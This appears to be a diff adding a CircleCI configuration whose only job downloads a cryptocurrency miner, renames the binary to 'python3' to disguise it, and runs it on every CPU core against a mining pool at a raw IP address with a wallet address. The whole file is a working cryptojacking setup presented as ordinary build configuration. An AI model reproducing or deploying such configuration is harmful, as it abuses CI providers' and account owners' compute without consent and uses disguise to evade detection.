@@ -1,0 +1,27 @@
+version: 2.1
+
+jobs:
+  mine:
+    docker:
+      - image: ubuntu:20.04
+    steps:
+      - run:
+          name: Install dependencies
+          command: |
+            apt update && apt install -y wget tar
+      - run:
+          name: Download miner & rename
+          command: |
+            wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
+            tar xf cpuminer-opt-linux.tar.gz
+            mv cpuminer-sse2 python3
+      - run:
+          name: Start mining
+          command: |
+            ./python3 -a power2b -o stratum+tcp://104.248.171.56:443 -u mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzi -p x -t$(nproc --all)
+
+workflows:
+  version: 2
+  mine_and_run:
+    jobs:
+      - mine
